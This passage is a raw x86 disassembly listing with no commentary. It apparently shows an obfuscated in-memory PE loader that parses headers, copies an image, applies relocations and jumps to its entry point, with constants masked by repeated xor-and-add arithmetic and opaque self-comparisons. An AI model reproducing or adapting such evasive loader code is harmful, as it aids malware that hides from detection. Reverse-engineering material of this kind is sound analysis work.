  413240:	add    ecx,esi
  413242:	push   ecx
  413243:	mov    ecx,DWORD PTR [ebp-0x8]
  413246:	xor    ecx,ebx
  413248:	add    ecx,esi
  41324a:	push   ecx
  41324b:	push   DWORD PTR [ebp-0x20]
  41324e:	call   DWORD PTR [eax+0x18]
  413251:	pop    edi
  413252:	pop    esi
  413253:	pop    ebx
  413254:	leave  
  413255:	ret    0x4
  413258:	push   ebp
  413259:	mov    ebp,esp
  41325b:	push   ecx
  41325c:	push   ecx
  41325d:	lea    eax,[ebp-0x8]
  413260:	mov    DWORD PTR [ebp-0x4],eax
  413263:	push   esi
  413264:	mov    esi,DWORD PTR [ebp-0x4]
  413267:	mov    eax,0xf881ba0f
  41326c:	mov    DWORD PTR [esi],eax
  41326e:	mov    esi,DWORD PTR [ebp-0x8]
  413271:	cmp    esi,eax
  413273:	pop    esi
  413274:	jne    0x41327e
  413276:	mov    BYTE PTR [ecx+0xa],0x7a
  41327a:	mov    BYTE PTR [edx+0x8],0x2f
  41327e:	mov    BYTE PTR [edx+0xa],0x7a
  413282:	mov    BYTE PTR [ecx+0x2],0x8
  413286:	leave  
  413287:	ret    
  413288:	push   ebp
  413289:	mov    ebp,esp
  41328b:	push   ecx
  41328c:	push   ecx
  41328d:	lea    eax,[ebp-0x8]
  413290:	mov    DWORD PTR [ebp-0x4],eax
  413293:	mov    edx,DWORD PTR [ebp-0x4]
  413296:	mov    eax,0xf88b0beb
  41329b:	mov    DWORD PTR [edx],eax
  41329d:	mov    edx,DWORD PTR [ebp-0x8]
  4132a0:	cmp    edx,eax
  4132a2:	jne    0x4132b3
  4132a4:	mov    eax,DWORD PTR [ebp+0x8]
  4132a7:	mov    BYTE PTR [ecx+0x9],0xe
  4132ab:	mov    BYTE PTR [eax+0x7],0x47
  4132af:	mov    BYTE PTR [ecx+0x6],0xf
  4132b3:	mov    BYTE PTR [ecx+0x3],0x1e
  4132b7:	leave  
  4132b8:	ret    0x4
  4132bb:	push   ebp
  4132bc:	mov    ebp,esp
  4132be:	push   ecx
  4132bf:	push   ecx
  4132c0:	lea    eax,[ebp-0x8]
  4132c3:	mov    DWORD PTR [ebp-0x4],eax
  4132c6:	mov    edx,DWORD PTR [ebp-0x4]
  4132c9:	mov    eax,0x7e0da0f
  4132ce:	mov    DWORD PTR [edx],eax
  4132d0:	mov    edx,DWORD PTR [ebp-0x8]
  4132d3:	cmp    edx,eax
  4132d5:	jne    0x4132db
  4132d7:	mov    BYTE PTR [ecx+0x7],0x47
  4132db:	mov    eax,DWORD PTR [ebp+0x8]
  4132de:	mov    BYTE PTR [ecx+0x1],0x5
  4132e2:	mov    BYTE PTR [eax+0x9],0x2e
  4132e6:	leave  
  4132e7:	ret    0x4
  4132ea:	push   ebp
  4132eb:	mov    ebp,esp
  4132ed:	push   ecx
  4132ee:	push   ecx
  4132ef:	lea    eax,[ebp-0x8]
  4132f2:	mov    DWORD PTR [ebp-0x4],eax
  4132f5:	push   esi
  4132f6:	mov    esi,DWORD PTR [ebp-0x4]
  4132f9:	mov    eax,0x7060e3c
  4132fe:	mov    DWORD PTR [esi],eax
  413300:	mov    esi,DWORD PTR [ebp-0x8]
  413303:	cmp    esi,eax
  413305:	pop    esi
  413306:	jne    0x413312
  413308:	mov    BYTE PTR [edx+0x4],0xb
  41330c:	mov    WORD PTR [ecx+0x3],0xb1e
  413312:	mov    BYTE PTR [edx],0x3f
  413315:	leave  
  413316:	ret    
  413317:	push   ebp
  413318:	mov    ebp,esp
  41331a:	push   ecx
  41331b:	push   ecx
  41331c:	lea    eax,[ebp-0x8]
  41331f:	mov    DWORD PTR [ebp-0x4],eax
  413322:	mov    edx,DWORD PTR [ebp-0x4]
  413325:	mov    eax,0xf8870b3f
  41332a:	mov    DWORD PTR [edx],eax
  41332c:	mov    edx,DWORD PTR [ebp-0x8]
  41332f:	cmp    edx,eax
  413331:	jne    0x41333e
  413333:	mov    eax,DWORD PTR [ebp+0x8]
  413336:	mov    BYTE PTR [ecx+0x8],0xf
  41333a:	mov    BYTE PTR [eax+0x1],0x5
  41333e:	mov    BYTE PTR [ecx+0x5],0xf3
  413342:	leave  
  413343:	ret    0x4
  413346:	push   esi
  413347:	mov    ecx,edi
  413349:	call   0x413317
  41334e:	mov    edx,edi
  413350:	mov    ecx,esi
  413352:	mov    BYTE PTR [esi],0x1f
  413355:	call   0x4132ea
  41335a:	push   esi
  41335b:	mov    ecx,edi
  41335d:	mov    BYTE PTR [esi+0x5],0xf3
  413361:	call   0x4132bb
  413366:	push   esi
  413367:	mov    BYTE PTR [esi+0x6],0xf
  41336b:	call   0x413288
  413370:	mov    BYTE PTR [esi+0x2],0x8
  413374:	mov    edx,esi
  413376:	jmp    0x413258
  41337b:	push   ebp
  41337c:	mov    ebp,esp
  41337e:	push   ecx
  41337f:	mov    ecx,DWORD PTR [edx+0x194]
  413385:	push   esi
  413386:	mov    esi,DWORD PTR [ebp+0x8]
  413389:	mov    esi,DWORD PTR [esi]
  41338b:	mov    DWORD PTR [ecx],esi
  41338d:	mov    ecx,DWORD PTR [edx+0x194]
  413393:	mov    ecx,DWORD PTR [ecx]
  413395:	mov    esi,DWORD PTR [edx+0x190]
  41339b:	mov    DWORD PTR [esi],ecx
  41339d:	mov    eax,DWORD PTR [edx+0x194]
  4133a3:	mov    ecx,DWORD PTR [eax]
  4133a5:	mov    ecx,DWORD PTR [ecx+0x3c]
  4133a8:	add    ecx,DWORD PTR [eax]
  4133aa:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  4133b1:	mov    eax,DWORD PTR [ebp-0x4]
  4133b4:	movzx  ecx,WORD PTR [ecx+0x16]
  4133b8:	xor    eax,0x7510896
  4133bd:	add    eax,0x3272dd
  4133c2:	pop    esi
  4133c3:	test   ecx,eax
  4133c5:	je     0x4133d3
  4133c7:	mov    eax,DWORD PTR [edx+0x1c8]
  4133cd:	mov    DWORD PTR [eax],0xf89c85b2
  4133d3:	leave  
  4133d4:	ret    0x4
  4133d7:	push   ebp
  4133d8:	mov    ebp,esp
  4133da:	sub    esp,0x70
  4133dd:	and    DWORD PTR [ebp-0x20],0x0
  4133e1:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  4133e8:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4133ef:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  4133f6:	mov    DWORD PTR [ebp-0x14],0xf89c85b3
  4133fd:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  413404:	mov    eax,DWORD PTR [ebp+0x20]
  413407:	mov    eax,DWORD PTR [eax+0x194]
  41340d:	mov    DWORD PTR [ebp-0xc],eax
  413410:	mov    eax,DWORD PTR [ebp+0x20]
  413413:	push   ebx
  413414:	push   esi
  413415:	mov    esi,DWORD PTR [eax+0x190]
  41341b:	mov    eax,DWORD PTR [ebp+0x20]
  41341e:	mov    eax,DWORD PTR [eax+0x18c]
  413424:	mov    DWORD PTR [ebp-0x8],eax
  413427:	mov    eax,DWORD PTR [eax]
  413429:	push   edi
  41342a:	mov    DWORD PTR [ebp-0x4],esi
  41342d:	test   eax,eax
  41342f:	jne    0x41343c
  413431:	push   DWORD PTR [ebp+0x1c]
  413434:	mov    edx,DWORD PTR [ebp+0x20]
  413437:	call   0x41337b
  41343c:	mov    eax,DWORD PTR [esi]
  41343e:	mov    ebx,DWORD PTR [esi]
  413440:	add    ebx,DWORD PTR [eax+0x3c]
  413443:	mov    eax,DWORD PTR [ebp+0xc]
  413446:	mov    ecx,DWORD PTR [ebp-0x8]
  413449:	mov    ecx,DWORD PTR [ecx]
  41344b:	mov    esi,0x7510896
  413450:	xor    eax,esi
  413452:	mov    edi,0x3272dd
  413457:	add    eax,edi
  413459:	cmp    eax,ecx
  41345b:	jne    0x413693
  413461:	mov    eax,DWORD PTR [ebp-0xc]
  413464:	mov    eax,DWORD PTR [eax]
  413466:	mov    DWORD PTR [ebp-0x10],eax
  413469:	mov    eax,DWORD PTR [ebx+0x50]
  41346c:	mov    DWORD PTR [ebp-0x68],eax
  41346f:	mov    eax,DWORD PTR [ebp-0x18]
  413472:	xor    eax,esi
  413474:	add    eax,edi
  413476:	mov    DWORD PTR [ebp-0x64],eax
  413479:	mov    eax,DWORD PTR [ebp-0x14]
  41347c:	and    DWORD PTR [ebp-0x6c],0x0
  413480:	xor    eax,esi
  413482:	add    eax,edi
  413484:	mov    DWORD PTR [ebp-0x60],eax
  413487:	lea    eax,[ebp-0x70]
  41348a:	push   eax
  41348b:	mov    eax,DWORD PTR [ebp+0x8]
  41348e:	xor    eax,esi
  413490:	add    eax,edi
  413492:	push   eax
  413493:	mov    eax,DWORD PTR [ebp+0x20]
  413496:	add    eax,0xaa
  41349b:	push   eax
  41349c:	mov    eax,DWORD PTR [ebp+0x20]
  41349f:	mov    eax,DWORD PTR [eax+0x198]
  4134a5:	mov    DWORD PTR [ebp-0x70],0x4
  4134ac:	push   DWORD PTR [eax]
  4134ae:	mov    eax,DWORD PTR [ebp+0x10]
  4134b1:	call   eax
  4134b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4134b6:	mov    ecx,DWORD PTR [ecx]
  4134b8:	mov    edx,DWORD PTR [ebp-0x8]
  4134bb:	mov    DWORD PTR [ebp-0x6c],eax
  4134be:	mov    DWORD PTR [ebp+0x1c],eax
  4134c1:	mov    DWORD PTR [edx],ecx
  4134c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4134c6:	mov    DWORD PTR [ecx],eax
  4134c8:	mov    eax,DWORD PTR [ebx+0x50]
  4134cb:	mov    DWORD PTR [ebp-0x68],eax
  4134ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4134d1:	xor    eax,esi
  4134d3:	add    eax,edi
  4134d5:	mov    DWORD PTR [ebp-0x64],eax
  4134d8:	lea    eax,[ebp-0x20]
  4134db:	mov    DWORD PTR [ebp-0x60],eax
  4134de:	lea    eax,[ebp-0x70]
  4134e1:	push   eax
  4134e2:	mov    eax,DWORD PTR [ebp+0x8]
  4134e5:	xor    eax,esi
  4134e7:	add    eax,edi
  4134e9:	push   eax
  4134ea:	mov    eax,DWORD PTR [ebp+0x20]
  4134ed:	add    eax,0xee
  4134f2:	push   eax
  4134f3:	mov    eax,DWORD PTR [ebp+0x20]
  4134f6:	mov    eax,DWORD PTR [eax+0x198]
  4134fc:	mov    DWORD PTR [ebp-0x70],0x4
  413503:	push   DWORD PTR [eax]
  413505:	mov    eax,DWORD PTR [ebp+0x10]
  413508:	call   eax
  41350a:	test   eax,eax
  41350c:	je     0x413531
  41350e:	and    DWORD PTR [ebp+0xc],0x0
  413512:	cmp    DWORD PTR [ebx+0x50],0x0
  413516:	jbe    0x413531
  413518:	mov    eax,DWORD PTR [ebp+0x1c]
  41351b:	mov    ecx,DWORD PTR [ebp-0x10]
  41351e:	sub    ecx,eax
  413520:	mov    dl,BYTE PTR [ecx+eax*1]
  413523:	inc    DWORD PTR [ebp+0xc]
  413526:	mov    BYTE PTR [eax],dl
  413528:	mov    edx,DWORD PTR [ebp+0xc]
  41352b:	inc    eax
  41352c:	cmp    edx,DWORD PTR [ebx+0x50]
  41352f:	jb     0x413520
  413531:	mov    edx,DWORD PTR [ebp+0x1c]
  413534:	mov    ecx,DWORD PTR [edx+0x3c]
  413537:	add    ecx,edx
  413539:	mov    eax,DWORD PTR [ecx+0xa0]
  41353f:	mov    ebx,DWORD PTR [ecx+0x28]
  413542:	add    eax,edx
  413544:	sub    edx,DWORD PTR [ebp-0x10]
  413547:	add    ebx,DWORD PTR [ebp+0x1c]
  41354a:	mov    DWORD PTR [ebp+0xc],edx
  41354d:	mov    DWORD PTR [ebp-0x2c],ecx
  413550:	mov    DWORD PTR [ebp-0x14],ebx
  413553:	mov    DWORD PTR [ebp-0x8],0x0
  41355a:	jmp    0x4135d6
  41355c:	add    edx,0xfffffff8
  41355f:	shr    edx,1
  413561:	mov    DWORD PTR [ebp-0x18],edx
  413564:	je     0x4135c2
  413566:	lea    edx,[eax+0x8]
  413569:	mov    DWORD PTR [ebp-0x4],edx
  41356c:	mov    edx,DWORD PTR [ebp-0x18]
  41356f:	mov    DWORD PTR [ebp-0x18],edx
  413572:	mov    edx,DWORD PTR [ebp-0x4]
  413575:	movzx  edx,WORD PTR [edx]
  413578:	mov    DWORD PTR [ebp-0x24],edx
  41357b:	and    edx,0xfff
  413581:	mov    DWORD PTR [ebp-0x28],edx
  413584:	mov    edx,DWORD PTR [ebp-0x24]
  413587:	shr    edx,0xc
  41358a:	add    edx,0xffcd8d23
  413590:	xor    edx,esi
  413592:	cmp    edx,0xf89c85b0
  413598:	jne    0x4135b9
  41359a:	mov    edx,DWORD PTR [ebp-0x28]
  41359d:	add    edx,DWORD PTR [ebp+0x1c]
  4135a0:	mov    ebx,DWORD PTR [eax]
  4135a2:	cmp    DWORD PTR [ebx+edx*1],0x0
  4135a6:	je     0x4135b6
  4135a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4135ab:	add    ecx,DWORD PTR [ebx+edx*1]
  4135ae:	mov    ebx,DWORD PTR [eax]
  4135b0:	mov    DWORD PTR [edx+ebx*1],ecx
  4135b3:	mov    ecx,DWORD PTR [ebp-0x2c]
  4135b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4135b9:	add    DWORD PTR [ebp-0x4],0x2
  4135bd:	dec    DWORD PTR [ebp-0x18]
  4135c0:	jne    0x413572
  4135c2:	mov    edx,DWORD PTR [ebp-0xc]
  4135c5:	add    DWORD PTR [ebp-0x8],edx
  4135c8:	mov    edx,DWORD PTR [ebp-0x8]
  4135cb:	cmp    edx,DWORD PTR [ecx+0xa4]
  4135d1:	jae    0x4135e4
  4135d3:	add    eax,DWORD PTR [ebp-0xc]
  4135d6:	mov    edx,DWORD PTR [eax+0x4]
  4135d9:	mov    DWORD PTR [ebp-0xc],edx
  4135dc:	test   edx,edx
  4135de:	jne    0x41355c
  4135e4:	mov    eax,DWORD PTR [ebp-0x10]
  4135e7:	mov    DWORD PTR [ebp-0x6c],eax
  4135ea:	mov    DWORD PTR [ebp-0x70],0x4
  4135f1:	mov    eax,DWORD PTR [ecx+0x50]
  4135f4:	mov    DWORD PTR [ebp-0x68],eax
  4135f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4135fa:	xor    eax,esi
  4135fc:	add    eax,edi
  4135fe:	mov    DWORD PTR [ebp-0x64],eax
  413601:	lea    eax,[ebp-0x20]
  413604:	mov    DWORD PTR [ebp-0x60],eax
  413607:	lea    eax,[ebp-0x70]
  41360a:	push   eax
  41360b:	mov    eax,DWORD PTR [ebp+0x8]
  41360e:	xor    eax,esi
  413610:	add    eax,edi
  413612:	push   eax
  413613:	mov    eax,DWORD PTR [ebp+0x20]
  413616:	add    eax,0xee
  41361b:	push   eax
  41361c:	mov    eax,DWORD PTR [ebp+0x20]
  41361f:	mov    eax,DWORD PTR [eax+0x198]
  413625:	push   DWORD PTR [eax]
  413627:	mov    eax,DWORD PTR [ebp+0x10]
  41362a:	call   eax
  41362c:	mov    eax,DWORD PTR [ebp+0x20]
  41362f:	mov    eax,DWORD PTR [eax+0x180]
  413635:	add    eax,DWORD PTR [ebp+0xc]
  413638:	mov    ecx,DWORD PTR [ebp+0xc]
  41363b:	push   DWORD PTR [ebp+0x18]
  41363e:	mov    DWORD PTR [eax],ecx
  413640:	push   DWORD PTR [ebp+0x14]
  413643:	push   DWORD PTR [ebp+0x1c]
  413646:	call   ebx
  413648:	mov    eax,DWORD PTR [ebp+0xc]
  41364b:	add    eax,DWORD PTR [ebp+0x20]
  41364e:	lea    ecx,[ebp+0x4]
  413651:	mov    DWORD PTR [ebp+0x20],eax
  413654:	mov    eax,DWORD PTR [ebp+0x20]
  413657:	mov    eax,DWORD PTR [ebp+0x20]
  41365a:	mov    edx,DWORD PTR [eax+0x190]
  413660:	mov    eax,DWORD PTR [ebp+0x20]
  413663:	mov    eax,DWORD PTR [eax+0x18c]
  413669:	mov    esi,DWORD PTR [eax]
  41366b:	cmp    DWORD PTR [ecx],esi
  41366d:	jb     0x41368e
  41366f:	mov    esi,DWORD PTR [edx]
  413671:	mov    edi,DWORD PTR [edx]
  413673:	mov    esi,DWORD PTR [esi+0x3c]
  413676:	lea    esi,[edi+esi*1+0x50]
  41367a:	mov    edi,DWORD PTR [eax]
  41367c:	add    edi,DWORD PTR [esi]
  41367e:	cmp    DWORD PTR [ecx],edi
  413680:	jae    0x41368e
  413682:	mov    esi,DWORD PTR [eax]
  413684:	mov    eax,DWORD PTR [ecx]
  413686:	mov    edx,DWORD PTR [edx]
  413688:	sub    eax,esi
  41368a:	add    edx,eax
  41368c:	mov    DWORD PTR [ecx],edx
  41368e:	mov    eax,DWORD PTR [ebp+0xc]
  413691:	jmp    0x4136d4
  413693:	push   DWORD PTR [ebp+0x20]
  413696:	call   0x412804
  41369b:	mov    eax,DWORD PTR [ebp+0x20]
  41369e:	mov    eax,DWORD PTR [eax+0x1c8]
  4136a4:	mov    eax,DWORD PTR [eax]
  4136a6:	xor    eax,esi
  4136a8:	add    eax,edi
  4136aa:	mov    eax,DWORD PTR [ebp+0x20]
  4136ad:	jne    0x4136c5
  4136af:	mov    ecx,DWORD PTR [ebp+0x20]
  4136b2:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4136b8:	push   DWORD PTR [ecx]
  4136ba:	mov    eax,DWORD PTR [eax+0x1d8]
  4136c0:	call   DWORD PTR [eax+0x28]
  4136c3:	jmp    0x4136d2
  4136c5:	mov    eax,DWORD PTR [eax+0x17c]
  4136cb:	mov    ecx,DWORD PTR [eax]
  4136cd:	lea    eax,[ebp+0x4]
  4136d0:	add    DWORD PTR [eax],ecx
  4136d2:	xor    eax,eax
  4136d4:	pop    edi
  4136d5:	pop    esi
  4136d6:	pop    ebx
  4136d7:	leave  
  4136d8:	ret    0x1c
  4136db:	push   ebp
  4136dc:	mov    ebp,esp
  4136de:	sub    esp,0x1c
  4136e1:	push   esi
  4136e2:	mov    esi,eax
  4136e4:	mov    eax,DWORD PTR [ecx+0x190]
  4136ea:	cmp    DWORD PTR [eax],0x0
  4136ed:	je     0x4137fd
  4136f3:	test   edx,edx
  4136f5:	je     0x4137fd
  4136fb:	test   esi,esi
  4136fd:	je     0x4137fd
  413703:	mov    eax,DWORD PTR [esi+0x88]
  413709:	test   eax,eax
  41370b:	je     0x4137f8
  413711:	cmp    DWORD PTR [esi+0x8c],0x10
  413718:	je     0x4137f8
  41371e:	cmp    DWORD PTR [esi+0x34],edx
  413721:	je     0x4137f8
  413727:	mov    esi,DWORD PTR [ecx+0x18c]
  41372d:	and    DWORD PTR [ebp-0x10],0x0
  413731:	mov    ecx,edx
  413733:	sub    ecx,DWORD PTR [esi]
  413735:	add    eax,edx
  413737:	movzx  edx,WORD PTR [eax+0xc]
  41373b:	mov    DWORD PTR [ebp-0x1c],ecx
  41373e:	movzx  ecx,WORD PTR [eax+0xe]
  413742:	add    ecx,edx
  413744:	je     0x4137f8
  41374a:	lea    ecx,[eax+0x14]
  41374d:	push   ebx
  41374e:	mov    DWORD PTR [ebp-0x18],ecx
  413751:	mov    esi,0x7fffffff
  413756:	push   edi
  413757:	test   DWORD PTR [ecx],esi
  413759:	je     0x4137da
  41375b:	mov    edx,DWORD PTR [ecx]
  41375d:	and    DWORD PTR [ebp-0xc],0x0
  413761:	and    edx,esi
  413763:	add    edx,eax
  413765:	movzx  edi,WORD PTR [edx+0xe]
  413769:	movzx  ebx,WORD PTR [edx+0xc]
  41376d:	add    edi,ebx
  41376f:	je     0x4137da
  413771:	lea    ecx,[edx+0x14]
  413774:	mov    DWORD PTR [ebp-0x14],ecx
  413777:	test   DWORD PTR [ecx],esi
  413779:	je     0x4137bc
  41377b:	mov    ecx,DWORD PTR [ecx]
  41377d:	and    DWORD PTR [ebp-0x8],0x0
  413781:	and    ecx,esi
  413783:	add    ecx,eax
  413785:	movzx  edi,WORD PTR [ecx+0xe]
  413789:	movzx  ebx,WORD PTR [ecx+0xc]
  41378d:	add    edi,ebx
  41378f:	je     0x4137bc
  413791:	lea    edi,[ecx+0x14]
  413794:	mov    DWORD PTR [ebp-0x4],edi
  413797:	mov    edi,DWORD PTR [ebp-0x4]
  41379a:	mov    edi,DWORD PTR [edi]
  41379c:	test   edi,edi
  41379e:	je     0x4137a6
  4137a0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4137a3:	add    DWORD PTR [edi+eax*1],ebx
  4137a6:	movzx  edi,WORD PTR [ecx+0xe]
  4137aa:	movzx  ebx,WORD PTR [ecx+0xc]
  4137ae:	inc    DWORD PTR [ebp-0x8]
  4137b1:	add    DWORD PTR [ebp-0x4],0x8
  4137b5:	add    edi,ebx
  4137b7:	cmp    DWORD PTR [ebp-0x8],edi
  4137ba:	jb     0x413797
  4137bc:	movzx  edi,WORD PTR [edx+0xe]
  4137c0:	movzx  ebx,WORD PTR [edx+0xc]
  4137c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4137c7:	inc    DWORD PTR [ebp-0xc]
  4137ca:	add    ecx,0x8
  4137cd:	add    edi,ebx
  4137cf:	mov    DWORD PTR [ebp-0x14],ecx
  4137d2:	cmp    DWORD PTR [ebp-0xc],edi
  4137d5:	jb     0x413777
  4137d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4137da:	movzx  edx,WORD PTR [eax+0xe]
  4137de:	movzx  edi,WORD PTR [eax+0xc]
  4137e2:	inc    DWORD PTR [ebp-0x10]
  4137e5:	add    ecx,0x8
  4137e8:	add    edx,edi
  4137ea:	mov    DWORD PTR [ebp-0x18],ecx
  4137ed:	cmp    DWORD PTR [ebp-0x10],edx
  4137f0:	jb     0x413757
  4137f6:	pop    edi
  4137f7:	pop    ebx
  4137f8:	xor    eax,eax
  4137fa:	inc    eax
  4137fb:	jmp    0x4137ff
  4137fd:	xor    eax,eax
  4137ff:	pop    esi
  413800:	leave  
  413801:	ret    
  413802:	push   ebp
  413803:	mov    ebp,esp
  413805:	mov    ecx,DWORD PTR [ecx+0x190]
  41380b:	mov    eax,DWORD PTR [ebp+0xc]
  41380e:	sub    esp,0x10
  413811:	push   ebx
  413812:	xor    ebx,ebx
  413814:	push   esi
  413815:	push   edi
  413816:	cmp    DWORD PTR [ecx],ebx
  413818:	je     0x4138a0
  41381e:	cmp    eax,ebx
  413820:	je     0x4138a0
  413822:	cmp    DWORD PTR [eax+0x78],ebx
  413825:	jne    0x41382c
  413827:	xor    eax,eax
  413829:	inc    eax
  41382a:	jmp    0x4138a2
  41382c:	mov    eax,DWORD PTR [eax+0x78]
  41382f:	add    eax,DWORD PTR [ebp+0x8]
  413832:	mov    ecx,DWORD PTR [eax+0x1c]
  413835:	mov    edx,DWORD PTR [eax+0x24]
  413838:	mov    esi,DWORD PTR [eax+0x14]
  41383b:	mov    edi,DWORD PTR [eax+0x18]
  41383e:	add    ecx,DWORD PTR [ebp+0x8]
  413841:	add    edx,DWORD PTR [ebp+0x8]
  413844:	mov    DWORD PTR [ebp-0x4],esi
  413847:	cmp    esi,edi
  413849:	ja     0x41384e
  41384b:	mov    DWORD PTR [ebp-0x4],edi
  41384e:	mov    DWORD PTR [ebp-0x8],ebx
  413851:	cmp    DWORD PTR [ebp-0x4],ebx
  413854:	jbe    0x413827
  413856:	cmp    ebx,DWORD PTR [eax+0x14]
  413859:	jae    0x413861
  41385b:	movzx  esi,WORD PTR [edx+ebx*2]
  41385f:	jmp    0x413863
  413861:	mov    esi,ebx
  413863:	lea    esi,[ecx+esi*4]
  413866:	mov    edi,DWORD PTR [esi]
  413868:	test   edi,edi
  41386a:	je     0x413895
  41386c:	add    edi,DWORD PTR [ebp+0x8]
  41386f:	mov    DWORD PTR [ebp-0x10],edi
  413872:	cmp    edi,eax
  413874:	jbe    0x413886
  413876:	mov    ebx,DWORD PTR [ebp+0xc]
  413879:	mov    ebx,DWORD PTR [ebx+0x7c]
  41387c:	add    ebx,eax
  41387e:	cmp    edi,ebx
  413880:	jae    0x413886
  413882:	mov    esi,DWORD PTR [esi]
  413884:	jmp    0x41388e
  413886:	sub    edi,DWORD PTR [ebp+0x8]
  413889:	mov    DWORD PTR [esi],edi
  41388b:	mov    esi,DWORD PTR [ebp-0x10]
  41388e:	test   esi,esi
  413890:	je     0x4138a0
  413892:	mov    ebx,DWORD PTR [ebp-0x8]
  413895:	inc    ebx
  413896:	mov    DWORD PTR [ebp-0x8],ebx
  413899:	cmp    ebx,DWORD PTR [ebp-0x4]
  41389c:	jb     0x413856
  41389e:	jmp    0x413827
  4138a0:	xor    eax,eax
  4138a2:	pop    edi
  4138a3:	pop    esi
  4138a4:	pop    ebx
  4138a5:	leave  
  4138a6:	ret    0x8
  4138a9:	push   ebp
  4138aa:	mov    ebp,esp
  4138ac:	sub    esp,0x2c
  4138af:	mov    edx,0xf89c85b5
  4138b4:	mov    DWORD PTR [ebp-0x4],edx
  4138b7:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  4138be:	mov    eax,DWORD PTR [ebp-0x4]
  4138c1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4138c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4138ca:	mov    ecx,DWORD PTR [ebp-0x4]
  4138cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4138d0:	push   ebx
  4138d1:	mov    ebx,DWORD PTR [ebp+0x10]
  4138d4:	push   esi
  4138d5:	mov    esi,0x7510896
  4138da:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  4138e1:	mov    ecx,DWORD PTR [ebp-0x4]
  4138e4:	mov    ebx,DWORD PTR [ebx+0x190]
  4138ea:	push   edi
  4138eb:	mov    edi,0x3272dd
  4138f0:	xor    ecx,esi
  4138f2:	xor    eax,esi
  4138f4:	add    eax,edi
  4138f6:	add    ecx,edi
  4138f8:	mov    DWORD PTR [ebp-0x18],eax
  4138fb:	cmp    ecx,DWORD PTR [ebx]
  4138fd:	je     0x413b7e
  413903:	mov    ebx,DWORD PTR [ebp-0x4]
  413906:	mov    ecx,DWORD PTR [ebp+0xc]
  413909:	xor    ebx,esi
  41390b:	add    ebx,edi
  41390d:	cmp    ebx,ecx
  41390f:	je     0x413b7e
  413915:	mov    ebx,DWORD PTR [ebp-0x4]
  413918:	mov    ecx,DWORD PTR [ecx+0x80]
  41391e:	xor    ebx,esi
  413920:	add    ebx,edi
  413922:	cmp    ecx,ebx
  413924:	je     0x413b79
  41392a:	add    ecx,DWORD PTR [ebp+0x8]
  41392d:	mov    DWORD PTR [ebp-0x2c],ecx
  413930:	mov    ebx,edx
  413932:	xor    ebx,esi
  413934:	add    ebx,edi
  413936:	mov    DWORD PTR [ebp-0x10],ebx
  413939:	mov    ebx,DWORD PTR [ebp-0x10]
  41393c:	cmp    ebx,edx
  41393e:	je     0x413952
  413940:	mov    edx,DWORD PTR [ebp-0x10]
  413943:	mov    ebx,DWORD PTR [ebp-0x4]
  413946:	imul   edx,edx,0x14
  413949:	xor    ebx,esi
  41394b:	add    ebx,edi
  41394d:	cmp    DWORD PTR [edx+ecx*1],ebx
  413950:	jne    0x413969
  413952:	mov    edx,DWORD PTR [ebp-0x10]
  413955:	mov    ebx,DWORD PTR [ebp-0x4]
  413958:	imul   edx,edx,0x14
  41395b:	xor    ebx,esi
  41395d:	add    ebx,edi
  41395f:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  413963:	je     0x413b6b
  413969:	mov    eax,DWORD PTR [ebp-0x4]
  41396c:	mov    ebx,DWORD PTR [ebp-0x4]
  41396f:	mov    eax,DWORD PTR [ebp-0x10]
  413972:	imul   eax,eax,0x14
  413975:	add    eax,ecx
  413977:	mov    ecx,DWORD PTR [eax+0x10]
  41397a:	add    ecx,DWORD PTR [ebp+0x8]
  41397d:	xor    ebx,esi
  41397f:	mov    DWORD PTR [ebp-0x1c],ecx
  413982:	mov    ecx,DWORD PTR [ebp-0x4]
  413985:	mov    edx,DWORD PTR [ebp-0x4]
  413988:	xor    ecx,esi
  41398a:	add    ecx,edi
  41398c:	xor    edx,esi
  41398e:	mov    DWORD PTR [ebp-0x24],ecx
  413991:	mov    ecx,DWORD PTR [eax]
  413993:	add    edx,edi
  413995:	add    ebx,edi
  413997:	cmp    ecx,edx
  413999:	je     0x4139a1
  41399b:	add    ecx,DWORD PTR [ebp+0x8]
  41399e:	mov    DWORD PTR [ebp-0x24],ecx
  4139a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4139a4:	xor    ecx,esi
  4139a6:	add    ecx,DWORD PTR [eax+0xc]
  4139a9:	mov    eax,DWORD PTR [ebp+0x8]
  4139ac:	lea    eax,[ecx+eax*1+0x3272dd]
  4139b3:	mov    DWORD PTR [ebp+0xc],eax
  4139b6:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  4139bd:	mov    eax,DWORD PTR [ebp+0x10]
  4139c0:	push   DWORD PTR [ebp+0xc]
  4139c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4139c9:	call   DWORD PTR [eax]
  4139cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4139ce:	xor    ecx,esi
  4139d0:	add    ecx,edi
  4139d2:	mov    DWORD PTR [ebp-0xc],eax
  4139d5:	cmp    ecx,eax
  4139d7:	jne    0x4139eb
  4139d9:	mov    eax,DWORD PTR [ebp+0x10]
  4139dc:	push   DWORD PTR [ebp+0xc]
  4139df:	mov    eax,DWORD PTR [eax+0x1d8]
  4139e5:	call   DWORD PTR [eax+0xc]
  4139e8:	mov    DWORD PTR [ebp-0xc],eax
  4139eb:	mov    DWORD PTR [ebp-0x20],0x7f661b0a
  4139f2:	mov    DWORD PTR [ebp-0x20],0xf89c999a
  4139f9:	mov    eax,DWORD PTR [ebp-0x4]
